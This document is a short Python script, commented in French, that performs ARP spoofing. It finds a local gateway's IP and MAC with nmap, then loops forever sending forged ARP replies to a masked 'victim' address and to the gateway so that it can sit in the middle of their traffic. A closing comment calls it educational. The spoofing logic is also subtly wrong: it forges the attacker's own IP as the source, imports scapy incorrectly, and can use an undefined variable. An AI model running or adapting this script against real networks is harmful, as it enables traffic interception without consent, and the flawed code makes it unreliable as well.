import re
import subprocess
import nmap3
import scapy
import socket

def run_nmap(cmd: str) -> str:
    """
    Essaie via nmap3 si possible, sinon fallback subprocess.
    """
    n = nmap3.Nmap()
    if hasattr(n, "run_command"):
        # Certaines versions exposent run_command
        return n.run_command(cmd=cmd)  # type: ignore
    # Fallback: exécute directement nmap
    return subprocess.check_output(cmd, shell=True, text=True, encoding="utf-8", errors="ignore")

def get_myip() -> str:
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)

def get_gateway_ip_via_dhcp() -> str | None:
    out = run_nmap("nmap --script broadcast-dhcp-discover -n")
    m = re.search(r"Router:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", out)
    return m.group(1) if m else None

def get_mac_of_ip(ip: str) -> str | None:
    out = run_nmap(f"nmap -sn -PR -n {ip}")
    m = re.search(r"MAC Address:\s*([0-9A-Fa-f:]{17})", out)
    return m.group(1).lower() if m else None


def arp_reply(src_ip: str, src_mac: str, dst_ip: str, dst_mac: str) -> None:
    arp_response = scapy.ARP(op=2, psrc=src_ip, hwsrc=src_mac, pdst=dst_ip, hwdst=dst_mac)
    scapy.send(arp_response, verbose=False)

my_ip = get_myip()

gw = get_gateway_ip_via_dhcp()
if not gw:
    print("Impossible de trouver la passerelle via DHCP (script bloqué ou pas de DHCP).")
else:
    mac_gate = get_mac_of_ip(gw)
    print("Gateway IP :", gw)
    print("Gateway MAC:", mac_gate)

while True:
    arp_reply(src_ip=get_myip(), src_mac=mac_gate, dst_ip="XXXXXX", dst_mac="XXXXX")
    print("ARP Reply envoyée à la victime.")
    arp_reply(src_ip=get_myip(), src_mac="3XXXXXXX", dst_ip=gw, dst_mac=mac_gate)



# Note: Ce code est à des fins éducatives uniquement. L'utilisation de techniques de spoofing ARP peut être illégale et contraire à l'éthique. Assurez-vous d'avoir l'autorisation explicite avant de mener de telles activités sur un réseau.
